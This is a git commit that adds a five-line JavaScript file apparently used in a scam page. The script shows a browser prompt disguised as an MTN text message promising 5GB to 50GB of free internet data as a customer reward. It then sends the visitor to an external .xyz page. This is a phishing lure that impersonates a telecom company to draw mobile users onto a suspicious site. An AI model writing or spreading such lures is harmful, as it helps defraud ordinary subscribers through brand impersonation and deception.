41b1140880f92314429437557dc2ec389d54aa40
okpoz <okpoitidz@gmail.com>
2026-07-03 08:51:26 +0100

    Create free-50gbdata-forall.js

---
+++ free-50gbdata-forall.js
@@ -0,0 +1,5 @@
+var password = '50GB Free Data'
+password=prompt('SMS: MTN SMS: Dear Customer, Kindly Receive Free Internet Data From 5GB To 50GB For Being Our Long Time Subscribers ,Customers Reward, press Free Data To Check Now');
+if (password != '50GB Free Data') {
+location.href='https://okpoitid.xyz/free-50gbdata-forall.html';
+}
